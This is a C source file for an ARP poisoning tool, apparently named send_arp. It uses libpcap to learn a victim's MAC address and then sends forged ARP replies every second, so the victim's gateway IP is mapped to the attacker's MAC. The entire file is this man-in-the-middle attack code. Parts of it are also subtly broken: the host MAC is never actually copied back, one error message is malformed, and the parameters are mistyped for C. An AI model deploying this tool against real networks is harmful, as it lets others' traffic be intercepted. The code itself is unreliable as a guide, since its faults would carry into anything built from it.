#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <pcap.h>
#include <unistd.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <net/if_arp.h>
#include <netinet/ip.h>

#define ETHERTYPE_ARP 0x0806
char broadcast[7] = "\xff\xff\xff\xff\xff\xff";

void usage(){
	printf("syntax: send_arp <interface> <target IP> <gateway> \n");
}
int GetHostMac(char *dev, unsigned char *Host_mac)
{
	int sd;
	struct ifreq Ifreq;
	struct if_nameindex *IfList;
	sd = socket(AF_INET, SOCK_STREAM,0);
	if(sd<0)
	{
		printf("Error occured : Can't call socket()\n");
		return 0;
	}
	IfList = if_nameindex(); //return net_interface's if_nameindex struct
	while(IfList->if_index !=0)
	{
		if(strcmp(IfList->if_name,dev))
		{
			IfList++;
			continue;
		}
		strncpy(Ifreq.ifr_name,IfList->if_name, IF_NAMESIZE);
		if(ioctl(sd,SIOCGIFHWADDR,&Ifreq)!=0){
			printf("Error occured : Can't call ioctl()\n"); 
			return 0;
		}
		Host_mac = (unsigned char*)Ifreq.ifr_hwaddr.sa_data;
		IfList++;
	}
	close(sd);
	return 1;
}

void SendPacket(pcap_t* handle, in_addr *target_ip, in_addr *sender_ip,
	unsigned char *Host_mac, unsigned char *Sender_mac, unsigned short opcode)
{
	unsigned char packet[ETHERMTU]; // ETHERMTU == 1500; in <netinet/if_ether.h>
	struct ether_header *eth_h;
	struct ether_arp *arp_h;


	memset(packet, 0, ETHERMTU);
	eth_h = (struct ether_header*)packet;
	memcpy(eth_h->ether_dhost, Sender_mac,6);
	memcpy(eth_h->ether_shost, Host_mac,6);
	eth_h->ether_type = htons(ETHERTYPE_ARP);

	arp_h = (struct ether_arp*)(packet + 14);
	arp_h->arp_hrd= htons(0x1);
	arp_h->arp_pro = htons(0x0800);
	arp_h->arp_hln = 0x06;
	arp_h->arp_pln = 0x04;
	arp_h->arp_op = htons(opcode);
	// opcode 1 : request
	// opcode 2 : reply
	// arp structure setting
	memcpy(arp_h->arp_sha, Host_mac,6); // gateway_mac
	memcpy(arp_h->arp_spa, target_ip,4); // gateway_ip 

	if(!memcmp(Sender_mac,broadcast,6)) // if broadcast packet send
		memcpy(arp_h->arp_tha, "\x00\x00\x00\x00\x00\x00",6);  // target MAC 
	else								 // ARP infection
		memcpy(arp_h->arp_tha, Sender_mac,6);
	memcpy(arp_h->arp_tpa, sender_ip,4); // target ip
	if(pcap_sendpacket(handle,packet, sizeof(struct ether_header)+ sizeof(struct ether_arp)))
		//return 0 on success
		printf("Sending Failed\n");
	else
		if(opcode==1)
			printf("Getting mac....\n");
		else if(opcode==2)
			printf("ARP Poisoning\n");
}



void GetTargetMac(char *dev,in_addr *target_ip, in_addr *sender_ip, unsigned char *Host_mac, unsigned char *Sender_mac)
{
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL){
		fprintf(stderr, "Error occured : Can't open device %s: %s\n",dev,errbuf);
		exit(1);
	}

	while(1){
		struct pcap_pkthdr* header;
		struct ether_header *eth_h;
		struct ether_arp* arp_h;

		const u_char* packet;
		unsigned short eth_type;

		SendPacket(handle, target_ip,sender_ip, Host_mac, broadcast,1);

		int res = pcap_next_ex(handle, &header, &packet);

		if(res == 0) continue; //not response
		if (res == -1 || res == -2) break; // error;

		eth_h = (struct ether_header*)packet;
		eth_type = htons(eth_h->ether_type);
		if(eth_type == ETHERTYPE_ARP) // if ARP pcaket receive
		{
			arp_h = (struct ether_arp*)(packet + sizeof(struct ether_header));
			if(!memcmp(sender_ip, arp_h->arp_spa,4)) // arp's source IP
			{
				memcpy(Sender_mac,arp_h->arp_sha,6); // arp's source MAC
				pcap_close(handle);
				return;
			}
		}
	}

	pcap_close(handle);
}


int main(int argc, char *argv[])
{
	char *dev;
	struct in_addr sender_ip;
	struct in_addr target_ip;
	unsigned char Host_mac[6];
	unsigned char Sender_mac[6];
	if (argc != 4)
	{
		usage();
		return 0;
	}
	dev = argv[1];
	inet_aton(argv[2], &sender_ip);
	inet_aton(argv[3], &target_ip);
	if(!GetHostMac(dev, Host_mac))
	{
		printf("Error occured : Can't get Host Mac Addr\n");
		return 0;
	}
	GetTargetMac(dev, &target_ip, &sender_ip, Host_mac, Sender_mac);
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if(handle == NULL)
	{
		fprintf(stderr, "Error occured : Can't open device %s : %s\n, dev, errbuf");
		exit(1);
	}
	while(1){
		SendPacket(handle, &target_ip, &sender_ip, Host_mac, Sender_mac, 2);
		sleep(1);
	}	
	pcap_close(handle);
}
